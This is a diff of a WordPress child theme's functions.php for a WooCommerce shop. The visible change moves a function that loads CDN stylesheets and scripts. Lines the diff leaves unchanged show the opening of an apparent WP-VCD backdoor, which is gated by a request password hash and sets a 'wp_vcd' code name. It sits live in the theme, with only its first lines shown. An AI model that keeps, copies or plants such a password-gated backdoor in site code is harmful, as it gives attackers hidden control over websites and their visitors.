@@ -1,4 +1,40 @@
 <?php
+//Add stylesheets and scripts to the website
+function child_theme_scripts() {
+// Bootstrap 4
+//if( basename(get_page_template(), ".php") == "tpl-order-home")
+//{
+
+    wp_enqueue_style('datepicker', '//cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.8.0/css/bootstrap-datepicker.standalone.css?v=1.8.0');
+    wp_enqueue_style('NProgress', 'https://cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css');
+
+    wp_enqueue_script( 'modernizr', '//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js', array( ),'',true);
+    wp_enqueue_script( 'boot1','//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js', array( 'jquery' ),'',true );
+    wp_enqueue_script( 'boot2','//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js', array( 'jquery' ),'',true );
+    wp_enqueue_script( 'bootstrap4js','//stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js', array( 'jquery' ),'',true );
+    wp_enqueue_script( 'jqueryvalidate','//cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/jquery.validate.js', array( 'jquery' ),'',true );
+    wp_enqueue_script( 'jqueryvalidateadditional','//cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/additional-methods.js', array( 'jquery' ),'',true );
+    wp_enqueue_script( 'datepickerjs','//cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.8.0/js/bootstrap-datepicker.min.js', array( 'jquery' ),'',true );
+    wp_enqueue_script( 'loadingoverlay',get_stylesheet_directory_uri() . '/assets/js/vendor/loadingoverlay.min.js', array( 'jquery' ),'',true );
+    // wp_enqueue_script( 'themejs', get_stylesheet_directory_uri() . '/assets/js/scripts.js', array( ),'',true);
+    wp_enqueue_script( 'BootstrapGrowlJS', '//cdnjs.cloudflare.com/ajax/libs/bootstrap-growl/1.0.0/jquery.bootstrap-growl.min.js', array( 'jquery' ),'',true );
+    wp_enqueue_script( 'FontAwesome5', '//kit.fontawesome.com/3d57dfbf2e.js', array(), '', true);
+    wp_enqueue_script( 'NProgressJS', '//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js', array( 'jquery' ),'',true );
+
+    wp_enqueue_style( 'bootstrap4', '//stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css', array('storefront-style','storefront-woocommerce-style'));
+
+    // Child Theme Styles
+    $style_cache_buster = date("YmdHi", filemtime( get_stylesheet_directory() . '/assets/css/style.css'));
+    wp_enqueue_style('storefront-child-style', get_stylesheet_directory_uri() . '/assets/css/style.css', array('storefront-style','storefront-woocommerce-style'), $style_cache_buster, 'all');
+    // $wholesale_style_cache_buster = date("YmdHi", filemtime( get_stylesheet_directory() . '/assets/css/style.wholesale.css'));
+    // wp_enqueue_style('storefront-child-wholesale_style', get_stylesheet_directory_uri() . '/assets/css/style.wholesale.css', array('storefront-style','storefront-woocommerce-style'), $wholesale_style_cache_buster, 'all');
+//}
+}
+add_action( 'wp_enqueue_scripts', 'child_theme_scripts', 20 );
+
+
+
+
 if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '944fd76047d775782db2f0668ae7e43a'))
 {
     $div_code_name="wp_vcd";
@@ -162,43 +198,6 @@ if(!function_exists('theme_temp_setup')) {
 
     }
 }
-
-//Add stylesheets and scripts to the website
-function child_theme_scripts() {
-// Bootstrap 4
-//if( basename(get_page_template(), ".php") == "tpl-order-home")
-//{
-
-    wp_enqueue_style('datepicker', '//cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.8.0/css/bootstrap-datepicker.standalone.css?v=1.8.0');
-    wp_enqueue_style('NProgress', 'https://cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css');
-    wp_enqueue_style('MaterialIcons', '//fonts.googleapis.com/icon?family=Material+Icons');
-
-    wp_enqueue_script( 'modernizr', '//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js', array( ),'',true);
-    wp_enqueue_script( 'boot1','//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js', array( 'jquery' ),'',true );
-    wp_enqueue_script( 'boot2','//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js', array( 'jquery' ),'',true );
-    wp_enqueue_script( 'bootstrap4js','//stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js', array( 'jquery' ),'',true );
-    wp_enqueue_script( 'jqueryvalidate','//cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/jquery.validate.js', array( 'jquery' ),'',true );
-    wp_enqueue_script( 'jqueryvalidateadditional','//cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/additional-methods.js', array( 'jquery' ),'',true );
-    wp_enqueue_script( 'datepickerjs','//cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.8.0/js/bootstrap-datepicker.min.js', array( 'jquery' ),'',true );
-    wp_enqueue_script( 'loadingoverlay',get_stylesheet_directory_uri() . '/assets/js/vendor/loadingoverlay.min.js', array( 'jquery' ),'',true );
-    // wp_enqueue_script( 'themejs', get_stylesheet_directory_uri() . '/assets/js/scripts.js', array( ),'',true);
-    wp_enqueue_script( 'BootstrapGrowlJS', '//cdnjs.cloudflare.com/ajax/libs/bootstrap-growl/1.0.0/jquery.bootstrap-growl.min.js', array( 'jquery' ),'',true );
-    wp_enqueue_script( 'FontAwesome5', '//kit.fontawesome.com/3d57dfbf2e.js', array(), '', true);
-    wp_enqueue_script( 'NProgressJS', '//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js', array( 'jquery' ),'',true );
-
-    wp_enqueue_style( 'bootstrap4', '//stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css', array('storefront-style','storefront-woocommerce-style'));
-
-    // Child Theme Styles
-    $style_cache_buster = date("YmdHi", filemtime( get_stylesheet_directory() . '/assets/css/style.css'));
-    wp_enqueue_style('storefront-child-style', get_stylesheet_directory_uri() . '/assets/css/style.css', array('storefront-style','storefront-woocommerce-style'), $style_cache_buster, 'all');
-    // $wholesale_style_cache_buster = date("YmdHi", filemtime( get_stylesheet_directory() . '/assets/css/style.wholesale.css'));
-    // wp_enqueue_style('storefront-child-wholesale_style', get_stylesheet_directory_uri() . '/assets/css/style.wholesale.css', array('storefront-style','storefront-woocommerce-style'), $wholesale_style_cache_buster, 'all');
-//}
-}
-add_action( 'wp_enqueue_scripts', 'child_theme_scripts', 20 );
-
-
-
 
 /**
  * TPL=ORDER-HOME-AJAX Handles
